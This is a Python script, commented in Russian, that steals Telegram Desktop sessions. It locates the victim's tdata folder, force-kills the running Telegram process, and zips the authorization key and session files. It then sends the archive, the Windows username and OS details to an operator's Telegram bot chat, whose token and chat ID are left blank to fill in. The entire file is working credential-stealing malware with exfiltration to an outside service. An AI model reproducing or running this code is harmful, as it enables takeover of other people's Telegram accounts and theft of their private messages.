import os
import platform
import telebot
import subprocess
from zipfile import ZipFile, ZIP_DEFLATED
import time
import re  # Импортируем модуль для регулярных выражений

# --- НАСТРОЙКА ---
BOT_TOKEN = ''  # ЗДЕСЬ ПИСАТЬ ТОКЕН БОТА ТЕЛЕГРАМ 
MY_ID = 0    # ЗДЕСЬ НАПИСАТЬ АЙДИ ЧАТА КУДА НУЖНО ПРИСЫЛАТЬ СЕССИЮ
# -----------------

bot = telebot.TeleBot(BOT_TOKEN)


def find_tdata_path():
    """Ищет папку tdata. Сначала проверяет стандартный путь, потом путь UWP-версии."""
    standard_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    if os.path.isdir(standard_path):
        return standard_path

    uwp_path = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Telegram Desktop UWP', 'tdata')
    if os.path.isdir(uwp_path):
        return uwp_path

    return None


def is_telegram_running():
    """Проверяет, запущен ли процесс telegram.exe."""
    try:
        output = subprocess.check_output('tasklist', shell=True, text=True, stderr=subprocess.DEVNULL)
        return 'telegram.exe' in output.lower()
    except Exception:
        return False


def archive_light_session(tdata_path, zip_path):
    """
    Архивирует ТОЛЬКО КЛЮЧЕВЫЕ файлы сессии, а не весь кэш.
    Это работает очень быстро и размер архива минимален.
    """
    try:
        with ZipFile(zip_path, 'w', ZIP_DEFLATED) as zf:
            # Ищем файлы, похожие на D877F783D5D35969 (папки с картами сессий)
            # и файлы без расширения в корне tdata (ключи авторизации)
            for item in os.listdir(tdata_path):
                item_path = os.path.join(tdata_path, item)
                # Если это папка, название которой состоит из 16 шестнадцатеричных символов
                if os.path.isdir(item_path) and re.match(r'^[0-9A-F]{16}$', item, re.IGNORECASE):
                    for root, dirs, files in os.walk(item_path):
                        for file in files:
                            abs_path = os.path.join(root, file)
                            rel_path = os.path.relpath(abs_path, tdata_path)
                            zf.write(abs_path, rel_path)
                # Если это файл без расширения в корне tdata
                elif os.path.isfile(item_path) and '.' not in item:
                    zf.write(item_path, item)
        return True
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Ошибка при создании лёгкого архива: {e}")
        return False


# --- Основной код ---
if __name__ == "__main__":
    try:
        user_info = f"🔔 Скрипт запущен!\n" \
                    f"👤 Пользователь: {os.getlogin()}\n" \
                    f"💻 ОС: {platform.system()} {platform.release()}"
        bot.send_message(MY_ID, user_info)

        tdata_folder = find_tdata_path()

        if not tdata_folder:
            bot.send_message(MY_ID, "⚠️ Папка tdata не найдена.")
        else:
            bot.send_message(MY_ID, f"✔️ Папка tdata найдена!")

            if is_telegram_running():
                bot.send_message(MY_ID, "⏳ Telegram запущен. Принудительно завершаю...")
                subprocess.run(['taskkill', '/IM', 'telegram.exe', '/F'], capture_output=True)
                time.sleep(1)  # Даем время процессу умереть

            bot.send_message(MY_ID, "🟢 Начинаю копирование ключевых файлов сессии...")
            temp_zip_file = os.path.join(os.path.expanduser("~"), 'tdata_light_session.zip')

            if archive_light_session(tdata_folder, temp_zip_file):
                bot.send_message(MY_ID, f"✅ Лёгкий архив успешно создан. Отправляю...")
                try:
                    with open(temp_zip_file, 'rb') as doc:
                        bot.send_document(MY_ID, doc, timeout=60)
                    os.remove(temp_zip_file)
                    bot.send_message(MY_ID, "🎉 Задача успешно выполнена!")
                except Exception as e:
                    bot.send_message(MY_ID, f"❌ Ошибка при отправке файла: {e}")
            else:
                bot.send_message(MY_ID, f"⚠️ Не удалось создать архив.")

    except Exception as e:
        bot.send_message(MY_ID, f"🔥 Критическая ошибка в скрипте: {e}")